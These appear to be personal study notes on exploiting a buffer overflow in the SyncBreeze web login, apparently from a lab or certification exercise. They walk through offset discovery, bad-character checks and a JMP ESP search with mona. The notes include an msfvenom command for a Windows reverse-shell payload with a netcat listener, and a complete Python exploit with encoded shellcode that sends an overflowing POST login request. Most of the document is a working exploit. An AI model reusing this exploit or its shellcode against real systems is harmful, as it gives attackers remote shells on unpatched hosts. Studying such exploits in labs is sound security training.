
BOF process on syncbreez:

1- get the request to the server, and send it through socket.

2- try different payload size using our fuzzer with while loop or spike.

3- after we get the right size of payload we use:
			
			msf-pattern_create -l <length>
			msf-pattern_offset -l <length> -q <query>

   to know exactly what byte number we should use in the payload.

4- get the bad chars:

			import sys
			for x in range(1,256):
			    sys.stdout.write ("\\x" + '{:02x}'.format(x))



			badchars={
				"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
				"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
				"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
				"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
				"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
				"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
				"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
				"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
				"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
				"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
				"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
				"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
				"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
				"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
				"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
				"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
			}

5- jump to esp:


	A-)	msf-nasm_shell > jmp esp = FFE4

	B-)	on the depugger:

		!mona modules
		!mona find -s "<\xff\xe4>" -m "<module name.extention>"

	C-) write it in the code as little endian

6- create the shell code:
		
		msfvenom -l payloads

		msfvenom -p windows/shell_reverse_tcp LHOST=192.168.64.134 LPORT=5555 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" EXITFUNC=thread

		nc -nlvp 443

========================================================================================================
=======================================================================================================

import socket
#\x0a\x0d\x25\x26\x2b\x3d

# Message=  0x10090c83 


shell=""
shell+="\xd9\xc3\xd9\x74\x24\xf4\x58\xbd\x01\xe0\x9d\x95\x31\xc9\xb1"
shell+="\x52\x31\x68\x17\x83\xc0\x04\x03\x69\xf3\x7f\x60\x95\x1b\xfd"
shell+="\x8b\x65\xdc\x62\x05\x80\xed\xa2\x71\xc1\x5e\x13\xf1\x87\x52"
shell+="\xd8\x57\x33\xe0\xac\x7f\x34\x41\x1a\xa6\x7b\x52\x37\x9a\x1a"
shell+="\xd0\x4a\xcf\xfc\xe9\x84\x02\xfd\x2e\xf8\xef\xaf\xe7\x76\x5d"
shell+="\x5f\x83\xc3\x5e\xd4\xdf\xc2\xe6\x09\x97\xe5\xc7\x9c\xa3\xbf"
shell+="\xc7\x1f\x67\xb4\x41\x07\x64\xf1\x18\xbc\x5e\x8d\x9a\x14\xaf"
shell+="\x6e\x30\x59\x1f\x9d\x48\x9e\x98\x7e\x3f\xd6\xda\x03\x38\x2d"
shell+="\xa0\xdf\xcd\xb5\x02\xab\x76\x11\xb2\x78\xe0\xd2\xb8\x35\x66"
shell+="\xbc\xdc\xc8\xab\xb7\xd9\x41\x4a\x17\x68\x11\x69\xb3\x30\xc1"
shell+="\x10\xe2\x9c\xa4\x2d\xf4\x7e\x18\x88\x7f\x92\x4d\xa1\x22\xfb"
shell+="\xa2\x88\xdc\xfb\xac\x9b\xaf\xc9\x73\x30\x27\x62\xfb\x9e\xb0"
shell+="\x85\xd6\x67\x2e\x78\xd9\x97\x67\xbf\x8d\xc7\x1f\x16\xae\x83"
shell+="\xdf\x97\x7b\x03\x8f\x37\xd4\xe4\x7f\xf8\x84\x8c\x95\xf7\xfb"
shell+="\xad\x96\xdd\x93\x44\x6d\xb6\x5b\x30\x2d\xc0\x34\x43\xad\xd9"
shell+="\x77\xca\x4b\x8b\x67\x9b\xc4\x24\x11\x86\x9e\xd5\xde\x1c\xdb"
shell+="\xd6\x55\x93\x1c\x98\x9d\xde\x0e\x4d\x6e\x95\x6c\xd8\x71\x03"
shell+="\x18\x86\xe0\xc8\xd8\xc1\x18\x47\x8f\x86\xef\x9e\x45\x3b\x49"
shell+="\x09\x7b\xc6\x0f\x72\x3f\x1d\xec\x7d\xbe\xd0\x48\x5a\xd0\x2c"
shell+="\x50\xe6\x84\xe0\x07\xb0\x72\x47\xfe\x72\x2c\x11\xad\xdc\xb8"
shell+="\xe4\x9d\xde\xbe\xe8\xcb\xa8\x5e\x58\xa2\xec\x61\x55\x22\xf9"
shell+="\x1a\x8b\xd2\x06\xf1\x0f\xf2\xe4\xd3\x65\x9b\xb0\xb6\xc7\xc6"
shell+="\x42\x6d\x0b\xff\xc0\x87\xf4\x04\xd8\xe2\xf1\x41\x5e\x1f\x88"
shell+="\xda\x0b\x1f\x3f\xda\x19";



c='A'*780+'\x83\x0c\x09\x10'+'\x90'*100+shell+'\x90'*(1500-100-len(shell)-780-4)
payload="username="+c+"&password=password"
request=""
request+="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.64.1\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(len(payload))+"\r\n"
request+="Origin: http://192.168.64.1\r\n"
request+="Connection: keep-alive\r\n"
request+="Referer: http://192.168.64.1/login\r\n"
request+="Cookie: security_level=0; PHPSESSID=gl4gde6t64c1hb6giigbmg0ki1; security=low\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+=payload

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.64.1",80))
s.send(request)
print(s.recv(1024))
s.close()



==========================================================================================================================
==========================================================================================================================

we can do almost all the BOF with just mona:

!mona pc 2000                                    ............pattern create
!mona config -setfilefolder c:\logs\%p 
!mona po 33684232                                ............pattern offset
!mona bytearray                                  ...........create badchars array
!mona compare -f c:\logs\folder\bytearray.bin -a <eib address>                          .......find the bad char
!mona bytearray -cpb "\x00"                             ................generate bytearray without \x00
!mona jmp -r ESP -m <module>



